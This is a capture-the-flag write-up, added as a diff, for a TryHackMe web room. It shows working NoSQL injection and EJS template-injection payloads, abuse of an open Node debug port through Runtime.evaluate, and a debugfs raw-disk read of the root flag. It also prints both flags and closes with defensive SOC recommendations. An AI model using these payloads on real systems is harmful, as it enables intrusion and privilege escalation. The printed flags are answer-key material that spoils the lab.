@@ -1,0 +1,117 @@
+# Room Name - TryHackMe: Do Not Disturb
+Date: 02 August 2026
+Difficulty: Hard
+Category: Web Exploitation / NoSQL Injection / SSTI / Node Inspector / Disk Group Privilege Escalation / Boot2Root
+
+# Scenario
+Sign is on the door. Room is active. You have access you were never given, and so does he. The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- nmap
+- gobuster
+- curl
+- netcat (nc)
+- Node.js Chrome DevTools Protocol (WebSocket)
+- debugfs
+
+# What I Did
+
+**Step 1 — Reconnaissance**
+- Ran nmap to identify open services:
+```
+nmap -sV -p- 10.49.163.24
+```
+- Found two open ports: 22 (SSH) and 80 (Node.js/Express web application).
+- Browsed the homepage and found a staff and guest login form with a username hint referencing an attendant account.
+- Ran gobuster and discovered /staff returning 403 with the message "Staff access only."
+
+**Step 2 — NoSQL injection authentication bypass**
+- Identified the login endpoint accepted JSON and tested MongoDB/NeDB operator injection using the $ne (not equal) operator to bypass password verification:
+```
+curl -X POST http://10.49.163.24/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
+```
+- Confirmed the injection worked by targeting the hinted attendant username specifically:
+```
+curl -c cookies.txt -X POST http://10.49.163.24/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"attendant","password":{"$ne":""}}'
+```
+- Response: {"ok":true,"role":"staff"} — authenticated as staff without knowing the password.
+
+**Step 3 — Server-Side Template Injection (EJS) for RCE**
+- Accessed the staff console and found a confirmation template preview feature that called ejs.render() directly on user-supplied input without sanitisation.
+- Tested SSTI using Node.js process module access to confirm code execution:
+```
+curl -b cookies.txt -X POST http://10.49.163.24/staff/preview \
+  --data-urlencode 'template=<%= process.mainModule.require("child_process").execSync("id").toString() %>'
+```
+- Confirmed RCE as uid=996(poolside).
+
+**Step 4 — Obtain a reverse shell and retrieve the user flag**
+- Used the SSTI vector to send a reverse shell back to the attack machine.
+- Started a netcat listener and triggered the shell via the template injection endpoint.
+- Located and read the user flag:
+```
+find / -iname "user.txt" 2>/dev/null
+cat /home/poolside/user.txt
+```
+
+**Step 5 — Enumerate for privilege escalation**
+- Ran ps aux and identified a second Node.js process, processor.js, running as a different user (pipelinesvc) with the Node debugger open on localhost:
+```
+127.0.0.1:9229
+```
+- This is a Chrome DevTools Protocol debug port, accessible locally from the poolside shell.
+
+**Step 6 — Exploit the open Node Inspector debug port**
+- Connected to the debug WebSocket and used Runtime.evaluate to execute arbitrary JavaScript in the pipelinesvc process context.
+- Used process.getBuiltinModule() instead of require or import since the target ran as an ES Module without a dynamic import callback:
+```javascript
+const ws = new WebSocket('ws://127.0.0.1:9229/<debugger-id>');
+ws.send(JSON.stringify({
+  id: 1,
+  method: 'Runtime.evaluate',
+  params: {
+    expression: "process.getBuiltinModule('child_process').execSync('id').toString()",
+    returnByValue: true
+  }
+}));
+```
+- Confirmed execution as: uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
+- Critically, pipelinesvc was a member of the disk group.
+
+**Step 7 — Obtain a shell as pipelinesvc**
+- Sent a reverse shell command through the same DevTools Protocol Runtime.evaluate method.
+- Caught a second reverse shell as pipelinesvc.
+
+**Step 8 — Exploit disk group membership to read the root flag**
+- Confirmed disk group membership grants direct read and write access to the raw block device /dev/nvme0n1p1, bypassing all filesystem permission checks entirely.
+- Used debugfs to read the root flag directly from the raw disk without needing root credentials or a kernel exploit:
+```
+debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
+```
+
+# What I Found
+- Login bypass method: NoSQL injection using $ne operator against NeDB/MongoDB
+- SSTI vulnerability: EJS ejs.render() called on unsanitised user input in /staff/preview
+- Shell obtained as: poolside (uid=996)
+- Debug port discovered: Node Inspector on 127.0.0.1:9229 (processor.js running as pipelinesvc)
+- Lateral movement to: pipelinesvc (uid=995, member of disk group)
+- Root flag access method: debugfs raw block device read via disk group membership
+- User flag: THM{w4rm_s3ss10n_h1j4ck3d}
+- Root flag: THM{r4w_d1sk_4cc3ss_w4s_t00_much}
+
+# Key Learning
+This room demonstrated a complete four-stage privilege escalation chain where no single vulnerability required root access. NoSQL injection bypassed authentication by exploiting operator injection in a JSON-accepting login endpoint. EJS template injection turned a seemingly benign preview feature into arbitrary code execution. A Node.js debug port left open in production allowed lateral movement to a second service account via the Chrome DevTools Protocol. Finally, unnecessary disk group membership converted a low-privileged service account into full raw filesystem access using debugfs, bypassing all Linux permission enforcement without a password or kernel exploit. Each stage exploited a configuration mistake rather than a zero-day, reinforcing that defence-in-depth at the configuration level is as important as patching.
+
+# What I Would Flag in a Real SOC
+- JSON login endpoints that accept MongoDB or NeDB operator objects without input sanitisation are vulnerable to NoSQL injection authentication bypass, all query inputs must be validated as strings before being passed to database query constructors
+- EJS or any other template engine called with ejs.render() on unsanitised user input is a critical SSTI vulnerability, template rendering must only accept trusted static templates with user input passed as data variables, never as the template string itself
+- Node.js processes running with --inspect or --inspect-brk flags in production expose the Chrome DevTools Protocol, which allows unauthenticated arbitrary code execution for any user with local network access to the debug port, debug ports must never be enabled in production and must be bound to localhost only during development
+- A service account belonging to the disk group has effective read and write access to all data on every raw block device on the system, this is functionally equivalent to root access for data confidentiality and integrity purposes and must never be granted to application service accounts
+- The ability to read /root/root.txt via debugfs without any root credentials confirms that filesystem-level access controls provided zero protection once the disk group membership was obtained, group membership audits must include disk, shadow, sudo, and docker as equivalent to root escalation paths
+- Lateral movement from poolside to pipelinesvc via a local debug port would appear in network logs only as loopback traffic and would generate no authentication events, detection requires process-level monitoring of WebSocket connections to localhost:9229 and alerting on Runtime.evaluate calls from unexpected source processes
